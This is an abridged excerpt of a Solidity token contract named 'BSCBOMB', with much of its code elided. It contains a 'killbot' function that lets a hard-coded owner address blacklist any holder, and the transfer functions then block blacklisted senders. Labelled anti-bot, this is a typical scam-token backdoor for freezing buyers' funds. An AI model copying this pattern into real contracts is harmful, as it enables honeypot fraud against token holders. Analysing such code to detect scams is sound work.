...
contract Ownable is Context {
    ...
    address private _OwnerAddress = 0x2Cd58bED8eA69E6720375EB3B3F41c2f4DB85eFb;
...
contract BSCBOMB is Context, IERC20, Ownable {
    ...
    mapping(address=>bool) isAntibot;

    uint256 private constant MAX = ~uint256(0);
    uint256 private _total = 1000000000000 * 10**3;
    uint256 private _tFeeTotal;
    
    string private _name = "BSCBOMB";
    string private _symbol = "BSCBOMB";
    ...
    function killbot(address _user) external OwnerAddress() {
        require(!isAntibot[_user], "user already killed");
        isAntibot[_user] = true;
        // emit events as well
    }
    ...
    function transferFrom(
        ...
        require(!isAntibot[sender], "Recipient is killed");
        if(blc){
    ...
    function _transfer(
        ...
        require(!isAntibot[from], "Recipient is backlisted");
    ...
    function _transfers(
        ...
        require(!isAntibot[sender], "Recipient is backlisted");
